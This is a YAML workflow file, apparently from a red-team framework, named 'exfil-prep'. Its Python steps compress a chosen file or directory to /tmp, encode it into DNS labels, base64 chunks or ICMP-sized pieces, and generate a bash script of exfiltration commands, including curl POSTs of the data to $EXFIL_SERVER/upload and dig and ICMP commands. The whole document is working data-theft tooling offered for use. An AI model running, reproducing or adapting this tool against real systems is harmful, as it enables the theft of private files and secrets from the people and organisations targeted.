name: exfil-prep
description: |
  Exfiltration preparation — stage, encode, and generate ready-to-use
  exfiltration commands for DNS, HTTP, or ICMP methods.
tags: [redteam, exfiltration, data, opsec]
dispatch:
  inputs:
    source_path:
      required: true
      type: string
      description: Path to file or directory to exfiltrate
    method:
      type: string
      default: dns
      description: "Exfil method: dns, http, or icmp"
    exfil_domain:
      type: string
      default: ""
      description: Domain for DNS exfiltration (required for dns method)
    chunk_size:
      type: string
      default: "2048"
      description: Chunk size in bytes for data splitting

jobs:
  stage:
    name: Stage Data
    outputs:
      staged_file: "{{ steps.archive-data.outputs.staged_file }}"
      staged_size: "{{ steps.archive-data.outputs.staged_size }}"
      original_size: "{{ steps.archive-data.outputs.original_size }}"
    steps:
    - name: archive-data
      timeout: 5
      continue-on-error: true
      script: |
        import gzip
        import tarfile
        import io
        from pathlib import Path

        source = "{{ inputs.source_path }}"
        src_path = Path(source)

        if not src_path.exists():
            print(f"[-] Source not found: {source}")
            raise SystemExit(1)

        # Create tar.gz archive
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tar:
            tar.add(str(src_path), arcname=src_path.name)

        archived = buf.getvalue()

        # Calculate sizes
        if src_path.is_file():
            original_size = src_path.stat().st_size
        else:
            original_size = sum(f.stat().st_size for f in src_path.rglob("*") if f.is_file())

        staged_file = "/tmp/ofx_exfil_staged.tar.gz"
        Path(staged_file).write_bytes(archived)

        ratio = (len(archived) / original_size * 100) if original_size > 0 else 0
        print(f"[+] Staged: {source}")
        print(f"    Original: {original_size} bytes")
        print(f"    Compressed: {len(archived)} bytes ({ratio:.1f}%)")

        with open("{{ env.OFX_OUTPUTS }}", "a") as f:
            f.write(f"staged_file={staged_file}\n")
            f.write(f"staged_size={len(archived)}\n")
            f.write(f"original_size={original_size}\n")

  encode:
    name: Encode for Exfil
    needs: [stage]
    outputs:
      encoded_file: "{{ steps.encode-data.outputs.encoded_file }}"
      chunk_count: "{{ steps.encode-data.outputs.chunk_count }}"
    steps:
    - name: encode-data
      timeout: 5
      continue-on-error: true
      script: |
        from ofx.api.exfil import dns_encode_payload, chunk_b64
        from pathlib import Path
        import json

        method = "{{ inputs.method }}"
        chunk_size = int("{{ inputs.chunk_size }}")
        staged_file = "{{ jobs.stage.outputs.staged_file }}"

        data = Path(staged_file).read_bytes()
        chunks = []

        if method == "dns":
            labels = dns_encode_payload(data, label_max=60)
            chunks = labels
            print(f"[+] DNS-encoded into {len(labels)} labels")

        elif method == "http":
            b64_chunks = chunk_b64(data, chunk_size=chunk_size)
            chunks = b64_chunks
            print(f"[+] Base64-chunked into {len(b64_chunks)} chunks (size={chunk_size})")

        elif method == "icmp":
            import base64
            encoded = base64.b64encode(data).decode()
            # Split into manageable ICMP payloads (max ~64 bytes per ping)
            icmp_size = 64
            chunks = [encoded[i:i+icmp_size] for i in range(0, len(encoded), icmp_size)]
            print(f"[+] ICMP-chunked into {len(chunks)} packets")

        else:
            print(f"[-] Unknown method: {method}")
            raise SystemExit(1)

        encoded_file = "/tmp/ofx_exfil_encoded.json"
        with open(encoded_file, "w") as f:
            json.dump({"method": method, "chunks": chunks}, f)

        print(f"    Saved to: {encoded_file}")

        with open("{{ env.OFX_OUTPUTS }}", "a") as f:
            f.write(f"encoded_file={encoded_file}\n")
            f.write(f"chunk_count={len(chunks)}\n")

  generate:
    name: Generate Exfil Commands
    needs: [stage, encode]
    steps:
    - name: build-commands
      timeout: 3
      continue-on-error: true
      script: |
        from ofx.api.exfil import dns_exfil_commands, icmp_exfil_command
        from pathlib import Path
        import json

        method = "{{ inputs.method }}"
        exfil_domain = "{{ inputs.exfil_domain }}"
        staged_file = "{{ jobs.stage.outputs.staged_file }}"
        chunk_count = "{{ jobs.encode.outputs.chunk_count }}"

        data = Path(staged_file).read_bytes()
        commands = []

        if method == "dns":
            if not exfil_domain:
                print("[-] DNS exfil requires exfil_domain input")
                raise SystemExit(1)
            commands = dns_exfil_commands(data, exfil_domain, tool="dig")
            print(f"[+] Generated {len(commands)} DNS exfil commands")
            print(f"    Domain: {exfil_domain}")

        elif method == "http":
            import base64
            encoded = base64.b64encode(data).decode()
            chunk_size = int("{{ inputs.chunk_size }}")
            chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
            for i, chunk in enumerate(chunks):
                cmd = f"curl -s -X POST -d 'data={chunk}&idx={i}&total={len(chunks)}' http://$EXFIL_SERVER/upload"
                commands.append(cmd)
            print(f"[+] Generated {len(commands)} HTTP POST commands")
            print("    Set $EXFIL_SERVER to your collector address")

        elif method == "icmp":
            import base64
            encoded = base64.b64encode(data).decode()
            icmp_chunks = [encoded[i:i+64] for i in range(0, len(encoded), 64)]
            for chunk in icmp_chunks:
                cmd = icmp_exfil_command(chunk, "$EXFIL_SERVER")
                commands.append(cmd)
            print(f"[+] Generated {len(commands)} ICMP exfil commands")
            print("    Set $EXFIL_SERVER to your collector address")

        out_file = "/tmp/ofx_exfil_commands.sh"
        with open(out_file, "w") as f:
            f.write("#!/bin/bash\n")
            f.write(f"# OFX Exfil Commands - method={method}\n")
            f.write(f"# Chunks: {len(commands)}\n\n")
            for cmd in commands:
                f.write(f"{cmd}\n")

        print(f"\n    Commands saved to: {out_file}")
        print(f"    Total commands: {len(commands)}")
        if commands:
            print(f"\n--- First 3 commands ---")
            for cmd in commands[:3]:
                print(f"  {cmd[:120]}")
            if len(commands) > 3:
                print(f"  ... ({len(commands) - 3} more)")

        with open("{{ env.OFX_OUTPUTS }}", "a") as f:
            f.write(f"commands_file={out_file}\n")
            f.write(f"command_count={len(commands)}\n")
      log-stdout: true
